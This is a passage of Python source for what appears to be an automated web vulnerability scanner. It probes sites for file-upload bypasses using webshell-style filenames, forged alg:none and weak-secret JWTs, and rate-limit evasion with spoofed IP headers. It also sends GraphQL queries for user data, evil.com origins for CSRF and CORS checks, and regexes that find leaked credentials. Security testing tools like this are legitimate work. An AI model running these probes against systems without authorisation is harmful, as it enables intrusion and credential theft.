        return targets

    async def _test(self, t):
        for payload in self.PAYLOADS:
            resp = await _send(self.session, t, payload)
            if not resp: continue
            if "evil.com" in str(resp.url) or "google.com" in str(resp.url):
                return [ScanResult("Open Redirect","medium",0.92,t["url"],"GET",t["fuzz_param"],
                    payload,f"Redirected to: {resp.url}",
                    [f"Set {t['fuzz_param']}={payload}"],6.1,"CWE-601","open_redirect")]
        return []


# ─────────────────────────────────────────────
# PHASE 4: FILE UPLOAD (safe payloads only)
# ─────────────────────────────────────────────
class FileUploadModule:
    BYPASS_NAMES = ["shell.php","shell.php5","shell.phtml","shell.php.jpg",
                    "shell.php%00.jpg","shell.asp","shell.aspx","shell.jsp"]
    SAFE_PAYLOADS = {
        ".php":   b"<?php echo 'VULNASSESS_UPLOAD_TEST_' . md5('safe'); die(); ?>",
        ".php5":  b"<?php echo 'VULNASSESS_UPLOAD_TEST_' . md5('safe'); die(); ?>",
        ".phtml": b"<?php echo 'VULNASSESS_UPLOAD_TEST_' . md5('safe'); die(); ?>",
        ".asp":   b'<% Response.Write("VULNASSESS_UPLOAD_TEST") %>',
        ".aspx":  b"VULNASSESS_UPLOAD_TEST",
        ".jsp":   b'<% out.println("VULNASSESS_UPLOAD_TEST"); %>',
    }
    DETECTION_MARKER = "VULNASSESS_UPLOAD_TEST"

    def __init__(self, session): self.session = session

    async def run(self, forms, base_url):
        results = []
        upload_forms = [f for f in forms if
                        any(v=="file" for v in f.get("params",{}).values()) or
                        "upload" in f.get("action","").lower()]
        for form in upload_forms[:3]:
            results.extend(await self._test(form, base_url))
        return results

    async def _test(self, form, base_url):
        for filename in self.BYPASS_NAMES[:4]:
            ext = "." + filename.rsplit(".", 1)[-1] if "." in filename else ".php"
            safe_content = self.SAFE_PAYLOADS.get(ext, self.SAFE_PAYLOADS[".php"])
            files = {"file": (filename, safe_content, "image/jpeg")}
            resp = await self.session.post(form["action"], files=files)
            if not resp or resp.status_code not in (200, 201): continue
            resp_lower = resp.text.lower()
            if not any(kw in resp_lower for kw in ["upload","success","saved",filename.split(".")[0]]): continue
            # Try to fetch the uploaded file to confirm execution
            upload_url = None
            url_match = re.search(r'(https?://[^\s"\'<>]+' + re.escape(filename) + r')', resp.text)
            if url_match: upload_url = url_match.group(1)
            confirmed = False
            if upload_url:
                exec_resp = await self.session.get(upload_url)
                if exec_resp and self.DETECTION_MARKER in exec_resp.text:
                    confirmed = True
            severity  = "critical" if confirmed else "high"
            confidence = 0.95 if confirmed else 0.75
            evidence   = "Script executed on server (RCE confirmed)" if confirmed else f"Server accepted {filename} upload"
            return [ScanResult("Unrestricted File Upload" + (" (RCE Confirmed)" if confirmed else " (Potential RCE)"),
                severity, confidence, form["action"], "POST", "file", filename,
                evidence, [f"Upload {filename} to {form['action']}", "Check if file is executable"],
                9.8 if confirmed else 8.5, "CWE-434", "file_upload")]
        return []


# ─────────────────────────────────────────────
# SECURITY HEADERS
# ─────────────────────────────────────────────
class SecurityHeadersModule:
    REQUIRED = {
        "X-Content-Type-Options":   ("nosniff",          "low"),
        "X-Frame-Options":          (["DENY","SAMEORIGIN"],"medium"),
        "Strict-Transport-Security":(None,               "medium"),
        "Content-Security-Policy":  (None,               "medium"),
        "X-XSS-Protection":         (None,               "low"),
        "Referrer-Policy":          (None,               "low"),
        "Permissions-Policy":       (None,               "low"),
    }
    def __init__(self, session): self.session = session

    async def run(self, base_url):
        resp = await self.session.get(base_url)
        if not resp: return []
        headers = {k.lower():v for k,v in resp.headers.items()}
        results = []
        for hdr,(expected,sev) in self.REQUIRED.items():
            if hdr.lower() not in headers:
                results.append(ScanResult(f"Missing Security Header: {hdr}",
                    sev, 1.0, base_url, "GET", "HTTP Header", hdr,
                    f"Header '{hdr}' not present",
                    [f"Check response headers of {base_url}"],
                    3.5 if sev=="low" else 5.0, None, "security_headers"))
        if "server" in headers and re.search(r"\d+\.\d+", headers["server"]):
            results.append(ScanResult("Server Version Disclosure","low",0.95,
                base_url,"GET","Server Header",headers["server"],
                f"Server header reveals version: {headers['server']}",
                ["Check 'Server' response header"],2.5,None,"security_headers"))
        return results


# ─────────────────────────────────────────────
# SSL/TLS
# ─────────────────────────────────────────────
class SSLModule:
    def __init__(self, session): self.session = session

    async def run(self, base_url):
        results = []; parsed = urlparse(base_url)
        if parsed.scheme == "http":
            return [ScanResult("No HTTPS / Plaintext HTTP","high",1.0,base_url,"GET","scheme",
                "http://","Site uses HTTP instead of HTTPS",["Note site uses HTTP"],7.0,"CWE-319","ssl_tls")]
        http_url = base_url.replace("https://","http://",1)
        resp = await self.session.get(http_url)
        if resp and not str(resp.url).startswith("https"):
            results.append(ScanResult("HTTP Not Redirected to HTTPS","medium",0.90,
                http_url,"GET","scheme","http://","HTTP not redirected to HTTPS",
                [f"Access {http_url}"],5.5,None,"ssl_tls"))
        return results


# ─────────────────────────────────────────────
# CSRF
# ─────────────────────────────────────────────
class CSRFModule:
    def __init__(self, session): self.session = session

    async def run(self, forms):
        results = []
        for form in [f for f in forms if f["method"]=="POST"][:5]:
            params_lower = {k.lower():v for k,v in form["params"].items()}
            has_csrf = any("csrf" in k or "token" in k or "_token" in k or "nonce" in k for k in params_lower)
            if not has_csrf:
                resp = await self.session.post(form["action"], data=form["params"],
                    headers={"Origin":"https://evil.com","Referer":"https://evil.com/"})
                if resp and resp.status_code in (200,201,302):
                    results.append(ScanResult("CSRF Protection Missing","medium",0.85,
                        form["action"],"POST","csrf_token","No CSRF token",
                        "POST form has no CSRF token and accepted cross-origin request",
                        [f"POST to {form['action']} from evil.com origin"],6.5,"CWE-352","csrf"))
        return results


# ─────────────────────────────────────────────
# COOKIE SECURITY
# ─────────────────────────────────────────────
class CookieSecurityModule:
    def __init__(self, session): self.session = session

    async def run(self, base_url):
        resp = await self.session.get(base_url)
        if not resp: return []
        results = []
        cookie_header = resp.headers.get("set-cookie","").lower()
        for name in resp.cookies:
            for issue, flag in [("Missing HttpOnly flag","httponly"),
                                 ("Missing Secure flag","secure"),
                                 ("Missing SameSite attribute","samesite")]:
                if flag not in cookie_header:
                    results.append(ScanResult(f"Insecure Cookie: {issue}","low",0.95,
                        base_url,"GET",f"Cookie: {name}",issue,
                        f"Cookie '{name}' has {issue}",
                        [f"Check Set-Cookie header for '{name}'"],3.0,"CWE-614","cookie_security"))
        return results


# ─────────────────────────────────────────────
# CLICKJACKING
# ─────────────────────────────────────────────
class ClickjackingModule:
    def __init__(self, session): self.session = session

    async def run(self, base_url):
        resp = await self.session.get(base_url)
        if not resp: return []
        headers = {k.lower():v for k,v in resp.headers.items()}
        xfo = headers.get("x-frame-options","").upper()
        csp = headers.get("content-security-policy","")
        if (not xfo or xfo not in ("DENY","SAMEORIGIN")) and "frame-ancestors" not in csp:
            return [ScanResult("Clickjacking Vulnerability","medium",0.90,
                base_url,"GET","X-Frame-Options","Missing",
                "No X-Frame-Options or CSP frame-ancestors directive",
                ["Embed site in iframe from external origin"],5.0,"CWE-1021","clickjacking")]
        return []


# ─────────────────────────────────────────────
# CORS
# ─────────────────────────────────────────────
class CORSModule:
    def __init__(self, session): self.session = session

    async def run(self, base_url):
        results = []
        for origin in ["https://evil.com","null","https://evil.com.trusted.com"]:
            resp = await self.session.get(base_url, headers={"Origin":origin})
            if not resp: continue
            acao = resp.headers.get("access-control-allow-origin","")
            acac = resp.headers.get("access-control-allow-credentials","")
            if acao == origin or acao == "*":
                sev  = "high" if acac.lower()=="true" else "medium"
                risk = 8.0   if acac.lower()=="true" else 5.5
                results.append(ScanResult("CORS Misconfiguration",sev,0.93,
                    base_url,"GET","Origin header",origin,
                    f"ACAO: {acao}, ACAC: {acac}",
                    [f"Send Origin: {origin}"],risk,"CWE-942","cors_check"))
                break
        return results


# ─────────────────────────────────────────────
# INFO DISCLOSURE
# ─────────────────────────────────────────────
class InfoDisclosureModule:
    PATHS = ["/.env","/.git/config","/config.php","/wp-config.php","/backup.sql",
             "/database.sql","/.htaccess","/web.config","/phpinfo.php",
             "/swagger.json","/openapi.json","/api-docs","/server-status",
             "/actuator","/actuator/env","/.DS_Store","/robots.txt",
             "/.well-known/security.txt","/crossdomain.xml"]
    PATTERNS = [(r"password\s*=\s*['\"]?[^\s'\"]+","Password in response"),
                (r"secret\s*=\s*['\"]?[^\s'\"]+","Secret key exposed"),
                (r"api[_-]?key\s*=\s*['\"]?[^\s'\"]+","API key in response"),
                (r"-----BEGIN (RSA |EC )?PRIVATE KEY-----","Private key exposed")]

    def __init__(self, session): self.session = session

    async def run(self, base_url):
        parsed = urlparse(base_url); base = f"{parsed.scheme}://{parsed.netloc}"
        results = []
        for path in self.PATHS:
            resp = await self.session.get(base + path)
            if resp and resp.status_code==200 and len(resp.text) > 10:
                results.append(ScanResult("Sensitive File / Path Disclosure","high",0.92,
                    base+path,"GET","URL path",path,f"Accessible: {path}",
                    [f"Access {base+path}"],7.5,"CWE-538","info_disclosure"))
        resp = await self.session.get(base_url)
        if resp:
            for pat,desc in self.PATTERNS:
                if re.search(pat, resp.text, re.I):
                    results.append(ScanResult(f"Information Disclosure: {desc}","medium",0.80,
                        base_url,"GET","response_body",pat,desc,
                        [f"Check response of {base_url}"],5.5,"CWE-200","info_disclosure"))
        return results


# ─────────────────────────────────────────────
# RATE LIMITING CHECK
# ─────────────────────────────────────────────
class RateLimitModule:
    BYPASS_HEADERS = [{"X-Forwarded-For":"127.0.0.1"},{"X-Real-IP":"127.0.0.1"},
                      {"X-Originating-IP":"127.0.0.1"},{"True-Client-IP":"127.0.0.1"},
                      {"X-Client-IP":"127.0.0.1"},{"CF-Connecting-IP":"127.0.0.1"}]

    def __init__(self, session): self.session = session

    async def run(self, base_url, login_forms):
        results = []
        for form in login_forms[:2]: results.extend(await self._test(form))
        results.extend(await self._test_url(base_url + "/api/login"))
        return results

    async def _test(self, form):
        test_data = {k:"test" for k in form["params"]}
        resp1 = await self.session.post(form["action"], data=test_data)
        if not resp1: return []
        for hdrs in self.BYPASS_HEADERS:
            resp = await self.session.post(form["action"], data=test_data, headers=hdrs)
            if resp and resp.status_code != 429 and resp1.status_code == 429:
                return [ScanResult("Rate Limit Bypass","medium",0.85,
                    form["action"],"POST","header",str(hdrs),
                    "Rate limit bypassed using IP spoofing header",
                    [f"Add header: {hdrs}"],5.8,"CWE-307","rate_limit")]
        return []

    async def _test_url(self, url):
        resp = await self.session.post(url, json={"email":"test","password":"test"})
        if resp and resp.status_code == 429:
            for hdrs in self.BYPASS_HEADERS[:3]:
                r = await self.session.post(url, json={"email":"test","password":"test"}, headers=hdrs)
                if r and r.status_code != 429:
                    return [ScanResult("Rate Limit Bypass (API)","medium",0.85,
                        url,"POST","header",str(hdrs),"API rate limit bypassed",
                        [f"Add header: {hdrs}"],5.8,"CWE-307","rate_limit")]
        return []


# ─────────────────────────────────────────────
# PHASE 5: GRAPHQL
# ─────────────────────────────────────────────
class GraphQLModule:
    ENDPOINTS = ["/graphql","/api/graphql","/v1/graphql","/gql","/graph"]
    INTROSPECT = '{"query":"{ __schema { queryType { name } types { name kind } } }"}'

    def __init__(self, session): self.session = session

    async def run(self, base_url):
        results = []; parsed = urlparse(base_url); base = f"{parsed.scheme}://{parsed.netloc}"
        for path in self.ENDPOINTS:
            ep = base + path
            resp = await self.session.post(ep, content=self.INTROSPECT.encode(),
                                           headers={"Content-Type":"application/json"})
            if not resp or resp.status_code != 200: continue
            try:
                data = resp.json()
                if "__schema" in str(data) or "queryType" in str(data):
                    results.append(ScanResult("GraphQL Introspection Enabled","medium",0.95,
                        ep,"POST","query",self.INTROSPECT,
                        "GraphQL schema exposed via introspection",
                        [f"POST introspection query to {ep}"],5.3,"CWE-200","graphql"))
                    results.extend(await self._bola(ep))
            except Exception: pass
        return results

    async def _bola(self, ep):
        for q in ['{"query":"{ user(id: 2) { email password } }"}',
                  '{"query":"{ users { id email role } }"}',
                  '{"query":"{ admin { users { id email } } }"}']:
            resp = await self.session.post(ep, content=q.encode(), headers={"Content-Type":"application/json"})
            if not resp: continue
            try:
                data = resp.json()
                if "data" in data and data["data"] and any(f in str(data) for f in ["email","password","role"]):
                    return [ScanResult("GraphQL BOLA / Broken Object Level Auth","high",0.88,
                        ep,"POST","query",q,"Sensitive user data returned without auth",
                        [f"POST query: {q}"],8.1,"CWE-639","graphql")]
            except Exception: pass
        return []


# ─────────────────────────────────────────────
# PHASE 5: API KEY LEAKAGE
# ─────────────────────────────────────────────
class APIKeyLeakageModule:
    KEY_PATTERNS = {
        "AWS Access Key":    r"AKIA[0-9A-Z]{16}",
        "Stripe Live Key":   r"sk_live_[0-9a-zA-Z]{24}",
        "GitHub Token":      r"ghp_[0-9a-zA-Z]{36}",
        "Google API Key":    r"AIza[0-9A-Za-z\-_]{35}",
        "JWT Token":         r"eyJ[A-Za-z0-9-_]+?\.[A-Za-z0-9-_]+?\.[A-Za-z0-9-_]*",
        "Generic API Key":   r"api[_-]?key[\"\'\s:=]+[A-Za-z0-9]{20,}",
        "Private Key Header":r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
        "Database URL":      r"(mysql|postgres|mongodb|redis)://[^\"\'\s]+",
    }

    def __init__(self, session): self.session = session

    async def run(self, js_files, all_urls, base_url):
        results = []
        sources = list(js_files)[:10] + [
            base_url, base_url+"/robots.txt", base_url+"/.env",
            base_url+"/config.js", base_url+"/swagger.json", base_url+"/openapi.json"]
        for url in sources:
            resp = await self.session.get(url)
            if not resp or resp.status_code != 200: continue
            for key_type, pattern in self.KEY_PATTERNS.items():
                if re.findall(pattern, resp.text, re.I):
                    results.append(ScanResult(f"API Key / Secret Leakage ({key_type})",
                        "critical",0.93,url,"GET","response_body",pattern,
                        f"Pattern matched: {key_type}",
                        [f"GET {url}", f"Search for: {key_type}"],9.1,"CWE-312","api_key_leakage"))
        return results


# ─────────────────────────────────────────────
# PHASE 5: JWT ATTACKS
# ─────────────────────────────────────────────
class JWTModule:
    def __init__(self, session): self.session = session

    async def run(self, base_url, all_responses):
        results = []
        pattern = r"eyJ[A-Za-z0-9-_]+?\.[A-Za-z0-9-_]+?\.[A-Za-z0-9-_]*"
        tokens = []
        for text in all_responses: tokens += re.findall(pattern, text)
        for token in tokens[:3]: results.extend(await self._analyze(token, base_url))
        return results

    async def _analyze(self, token, base_url):
        results = []
        try:
            parts = token.split(".")
            if len(parts) != 3: return results
            header = json.loads(base64.urlsafe_b64decode(parts[0]+"=="))
            alg = header.get("alg","")
            none_hdr = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
            none_token = f"{none_hdr}.{parts[1]}."
            resp = await self.session.get(base_url, headers={"Authorization":f"Bearer {none_token}"})
            if resp and resp.status_code==200 and "unauthorized" not in resp.text.lower():
                results.append(ScanResult("JWT Algorithm Confusion (None Alg Attack)",
                    "critical",0.95,base_url,"GET","Authorization",none_token[:80]+"...",
                    "Server accepted JWT with alg:none",
                    ["Change JWT header alg to 'none'","Remove signature"],9.8,"CVE-2015-9235","jwt"))
            for secret in ["secret","password","123456","jwt","key",alg.lower()]:
                msg = f"{parts[0]}.{parts[1]}".encode()
                expected_sig = base64.urlsafe_b64encode(
                    _hmac.new(secret.encode(), msg, "sha256").digest()
                ).rstrip(b"=").decode()
                if expected_sig == parts[2]:
                    results.append(ScanResult("JWT Weak Secret","critical",0.99,
                        base_url,"GET","JWT",secret,f"JWT signed with weak secret: '{secret}'",
                        ["Crack JWT with wordlist",f"Secret: {secret}"],9.5,"CWE-327","jwt"))
                    break
        except Exception as e:
            logger.debug(f"JWT analysis error: {e}")
        return results


# ─────────────────────────────────────────────
# MAIN SCAN ENGINE
# ─────────────────────────────────────────────
async def run_scan(scan_id: str, target_url: str, username: str=None, password: str=None,
                   proxy_enabled: bool=False, proxy_url: str=None, proxy_type: str="http"):
    from app.db.database import get_database
    db = get_database()

    async def update(status, step, progress, extra=None):
        d = {"status":status,"current_step":step,"progress":progress,"updated_at":datetime.utcnow()}
        if extra: d.update(extra)
        await db.scans.update_one({"_id":ObjectId(scan_id)},{"$set":d})

    # Clean up any leftover cancel flag from a previous run
    cancel_flags.pop(scan_id, None)

    try:
        await update("running","Initializing scanner",2)
        if not target_url.startswith(("http://","https://")):
            target_url = "https://" + target_url

        enabled_modules = set()
        async for m in db.modules.find({"enabled":True}):
            enabled_modules.add(m["module_key"])

        proxy   = proxy_url if proxy_enabled and proxy_url else None
        session = ScanSession(proxy=proxy, max_requests=500)
        await session.init()
        all_results: List[ScanResult] = []
        all_responses: List[str]      = []
        baseline = StatisticalBaseline()
        crawler  = None

        try:
            # ── CRAWL ─────────────────────────────────────────
            _check_cancel(scan_id)
            await update("running","Crawling target website",8)
            crawler = Crawler(session, target_url)
            await crawler.crawl(max_pages=25)
            forms      = crawler.forms
            param_urls = crawler.urls_with_params
            js_files   = crawler.js_files
            all_urls   = crawler.all_urls

            for url in all_urls[:5]:
                r = await session.get(url)
                if r: all_responses.append(r.text)

            # ── AUTHENTICATED LOGIN ───────────────────────────
            if username and password:
                await update("running","Attempting authenticated login",10)
                auth_sess = AuthenticatedSession()
                ok = await auth_sess.login(session, target_url, username, password)
                extra_flag = {"authenticated":True} if ok else {"auth_failed":True}
                await update("running","Login "+("succeeded" if ok else "failed"),11,extra_flag)
                # Drop credentials from memory once authentication phase completes.
                username = None
                password = None

            # ── MODULES ───────────────────────────────────────
            steps = [
                ("auth_test",        "Testing Authentication",         12, lambda: AuthBypassModule(session).run(forms, target_url)),
                ("sql_injection",     "Testing SQL Injection",          18, lambda: SQLiModule(session, baseline).run(forms, param_urls)),
                ("xss",              "Testing Cross-Site Scripting",   24, lambda: XSSModule(session).run(forms, param_urls, js_files)),
                ("csrf",             "Testing CSRF Protection",        30, lambda: CSRFModule(session).run(forms)),
                ("path_traversal",   "Testing Path Traversal / LFI",   35, lambda: PathTraversalModule(session).run(forms, param_urls)),
                ("security_headers", "Checking Security Headers",      40, lambda: SecurityHeadersModule(session).run(target_url)),
                ("ssl_tls",          "Analyzing SSL/TLS",              45, lambda: SSLModule(session).run(target_url)),
                ("open_redirect",    "Testing Open Redirects",         50, lambda: OpenRedirectModule(session).run(forms, param_urls)),
                ("info_disclosure",  "Checking Information Disclosure", 55, lambda: InfoDisclosureModule(session).run(target_url)),
                ("cors_check",       "Testing CORS Configuration",     60, lambda: CORSModule(session).run(target_url)),
                ("cookie_security",  "Checking Cookie Security",       64, lambda: CookieSecurityModule(session).run(target_url)),
                ("rate_limiting",    "Testing Rate Limiting",          68, lambda: RateLimitModule(session).run(
                    target_url, [f for f in forms if any(kw in f["action"].lower() for kw in ["login","auth","signin"])])),
                ("file_upload",      "Testing File Upload Security",   72, lambda: FileUploadModule(session).run(forms, target_url)),
                ("clickjacking",     "Testing Clickjacking",           75, lambda: ClickjackingModule(session).run(target_url)),
                ("ssrf",             "Testing SSRF",                   78, lambda: SSRFModule(session).run(forms, param_urls, target_url)),
                ("xxe",              "Testing XXE Injection",          81, lambda: XXEModule(session).run(forms, target_url)),
                ("command_injection","Testing Command Injection",      84, lambda: CommandInjectionModule(session).run(forms, param_urls)),
                ("idor",             "Testing IDOR",                   87, lambda: IDORModule(session).run(forms, param_urls)),
                ("graphql",          "Testing GraphQL",                90, lambda: GraphQLModule(session).run(target_url)),
                ("api_key_leakage",  "Scanning for API Key Leakage",   93, lambda: APIKeyLeakageModule(session).run(js_files, all_urls, target_url)),
                ("jwt",              "Testing JWT Security",           96, lambda: JWTModule(session).run(target_url, all_responses)),
                ("rate_limit",       "Testing Rate Limit Bypass",      98, lambda: RateLimitModule(session).run(
                    target_url, [f for f in forms if any(kw in f["action"].lower() for kw in ["login","auth","signin"])])),
            ]

            for mod_key, step_label, progress, fn in steps:
                _check_cancel(scan_id)
                if mod_key not in enabled_modules: continue
                await update("running", step_label, progress)
                try:
                    results = await fn()
                    all_results.extend(results)
                    if session.limit_hit:
                        logger.warning(f"Request limit hit during {mod_key}")
                        break
                except ScanCancelledException:
                    raise
                except Exception as e:
                    logger.error(f"Module {mod_key} error: {e}")

        finally:
            await session.close()
            cancel_flags.pop(scan_id, None)

        # ── DEDUPLICATE & SCORE ───────────────────────────────
        seen = set(); unique = []
        for r in all_results:
            key = f"{r.vuln_type}|{r.url}|{r.param}"
            if key not in seen: seen.add(key); unique.append(r)

        weights = {"critical":10,"high":7,"medium":4,"low":1,"info":0}
        total_risk = sum(weights.get(r.severity,0)*r.confidence for r in unique)
        total_risk = min(10.0, round(total_risk/max(len(unique),1)*1.5, 2))

        sev_counts = {"critical":0,"high":0,"medium":0,"low":0,"info":0}
        for r in unique: sev_counts[r.severity] = sev_counts.get(r.severity,0)+1

        extra = {}
        if session.limit_hit:
            extra["warning"] = f"Request limit ({session.max_requests}) reached — scan may be incomplete"

        await db.scans.update_one({"_id":ObjectId(scan_id)},{"$set":{
            "status":"completed","current_step":"Scan completed","progress":100,
            "vulnerabilities":[r.to_dict() for r in unique],
            "total_vulnerabilities":len(unique),
            "severity_counts":sev_counts,"total_risk_score":total_risk,
            "completed_at":datetime.utcnow(),"updated_at":datetime.utcnow(),
            "pages_crawled":len(crawler.visited) if crawler else 0,
            "requests_made":session.request_count,
            **extra,
        }})
        logger.info(f"Scan {scan_id} complete: {len(unique)} vulns, risk={total_risk}, reqs={session.request_count}")

    except ScanCancelledException:
        logger.info(f"Scan {scan_id} cancelled")
        cancel_flags.pop(scan_id, None)
        await db.scans.update_one({"_id":ObjectId(scan_id)},{"$set":{
            "status":"cancelled","current_step":"Cancelled by user",
            "updated_at":datetime.utcnow(),
            "vulnerabilities":[], "total_vulnerabilities":0,
            "severity_counts":{"critical":0,"high":0,"medium":0,"low":0,"info":0},
        }})

    except Exception as e:
        logger.error(f"Scan {scan_id} failed: {e}", exc_info=True)
        cancel_flags.pop(scan_id, None)
        await db.scans.update_one({"_id":ObjectId(scan_id)},{"$set":{
            "status":"failed","error":str(e),"updated_at":datetime.utcnow(),
        }})